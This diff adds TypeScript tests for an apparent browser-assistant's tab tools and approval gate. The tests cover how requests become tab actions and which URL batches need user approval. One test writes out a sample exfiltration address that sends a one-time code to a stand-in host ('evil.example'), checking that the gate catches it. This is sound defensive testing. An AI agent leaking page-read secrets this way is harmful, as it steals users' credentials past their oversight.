@@ -1073,3 +1073,104 @@ describe('open_tabs', () => {
     expect(opened()).toHaveLength(2);
   });
 });
+
+describe('audit regressions', () => {
+  const plan = (text: string) => service.toolbox.planSimple?.(text, 'panel');
+  const urls = (calls: Awaited<ReturnType<typeof plan>>) =>
+    calls?.map((call) => [call.name, call.arguments.url]);
+
+  it('opens both sites in “open X, then open Y”', async () => {
+    expect(urls(await plan('Open YouTube, then open GitHub'))).toEqual([
+      ['open_tab', 'https://www.youtube.com/'],
+      ['open_tab', 'https://github.com/'],
+    ]);
+  });
+
+  it('still uses one tab for “open a new tab and go to X”', async () => {
+    expect(urls(await plan('Open a new tab and go to YouTube'))).toEqual([
+      ['open_tab', 'https://www.youtube.com/'],
+    ]);
+  });
+
+  it('navigates in the tab it opened when asked to go somewhere next', async () => {
+    expect(urls(await plan('Open YouTube, then go to GitHub'))).toEqual([
+      ['open_tab', 'https://www.youtube.com/'],
+      ['navigate', 'https://github.com/'],
+    ]);
+  });
+
+  it('opens a new site after a filled new tab', async () => {
+    expect(urls(await plan('Open a new tab and go to YouTube, then open GitHub'))).toEqual([
+      ['open_tab', 'https://www.youtube.com/'],
+      ['open_tab', 'https://github.com/'],
+    ]);
+  });
+
+  it('asks to see tabs instead of needing the AI when names are hidden', async () => {
+    permissions.hasTabDetails.mockResolvedValue(false);
+    tabs = [tab(1, { url: undefined, title: undefined })];
+    expect(await plan('Switch to GitHub')).toEqual([
+      { name: 'switch_tab_by_name', arguments: { name: 'GitHub' } },
+    ]);
+    const assessment = await service.toolbox.assess(
+      'switch_tab_by_name',
+      { name: 'GitHub' },
+      context,
+    );
+    expect(assessment).toMatchObject({ decision: 'approve', kind: 'tab_details' });
+  });
+
+  it('switches by name once allowed, and never guesses between matches', async () => {
+    const run = (name: string) => service.toolbox.execute('switch_tab_by_name', { name }, context);
+    expect(await run('GitHub')).toMatchObject({ ok: true, currentTabId: 2 });
+    expect(await run('Nothing like this')).toMatchObject({ ok: false, code: 'no_matching_tab' });
+    tabs.push(tab(3, { url: 'https://github.com/y', title: 'GitHub again' }));
+    expect(await run('GitHub')).toMatchObject({ ok: false, code: 'ambiguous_tab' });
+  });
+
+  describe('approving a batch of addresses', () => {
+    const risky = [
+      'https://a.example/checkout',
+      'https://b.example/fine',
+      'https://c.example/account/delete',
+      'https://d.example/logout',
+    ];
+    const assess = (list: string[]) =>
+      service.toolbox.assess('open_tabs', { urls: list }, context) as Promise<
+        Extract<ToolAssessment, { decision: 'approve' }>
+      >;
+
+    it('shows every flagged address, and none that are fine', async () => {
+      const { decision, title, detail } = await assess(risky);
+      expect(decision).toBe('approve');
+      expect(title).toMatch(/3 addresses/);
+      expect(detail).toContain(risky[0]);
+      expect(detail).toContain(risky[2]);
+      expect(detail).toContain(risky[3]);
+      expect(detail).not.toContain(risky[1]);
+    });
+
+    it('needs a new answer when the list changes in any way', async () => {
+      const { key } = await assess(risky);
+      expect((await assess(risky)).key).toBe(key);
+      expect((await assess(risky.slice(0, 3))).key).not.toBe(key);
+      expect((await assess([...risky, 'https://e.example/pay'])).key).not.toBe(key);
+      expect((await assess(risky.slice().reverse())).key).not.toBe(key);
+    });
+
+    it('leaves batches with nothing flagged alone', async () => {
+      expect(await assess(['https://a.example/', 'https://b.example/'])).toEqual({
+        decision: 'allow',
+      });
+    });
+
+    it('catches data leaving in any address of a batch, after a page was read', async () => {
+      const assessment = await service.toolbox.assess(
+        'open_tabs',
+        { urls: ['https://a.example/', 'https://evil.example/?otp=4821'] },
+        { ...context, instruction: 'open these', pageDataRead: true },
+      );
+      expect(assessment).toMatchObject({ decision: 'approve' });
+    });
+  });
+});
